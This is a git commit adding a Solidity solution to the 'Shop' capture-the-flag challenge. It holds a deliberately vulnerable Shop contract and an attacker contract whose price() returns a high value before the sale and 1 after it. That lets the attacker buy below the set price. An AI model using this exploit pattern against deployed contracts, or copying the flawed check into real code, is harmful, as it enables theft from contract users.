8ef244b259caff8d46db2acd5ca6c492372adb32
Anand Kumar <82324643+AnandK-2024@users.noreply.github.com>
2023-04-13 21:08:33 +0530

    complete shop ctf

---
+++ shop.sol
@@ -0,0 +1,44 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Buyer {
+  function price() external view returns (uint);
+}
+
+contract Shop {
+  uint public price = 100;
+  bool public isSold;
+
+  function buy() public {
+    Buyer _buyer = Buyer(msg.sender);
+
+    if (_buyer.price() >= price && !isSold) {
+      isSold = true;
+      price = _buyer.price();
+    }
+  }
+}
+
+
+////////////////////Attacker contract////////////////
+
+contract Attack{
+    Shop public attacker;
+
+    constructor(Shop Add){
+        attacker=Shop(Add);
+    }
+    function attack() public {
+            attacker.buy();
+
+    }
+    function price() external view returns (uint){
+        if(!attacker.isSold()){
+            return 1000;
+        }
+        else{
+            return 1;
+        }
+    }
+
+}
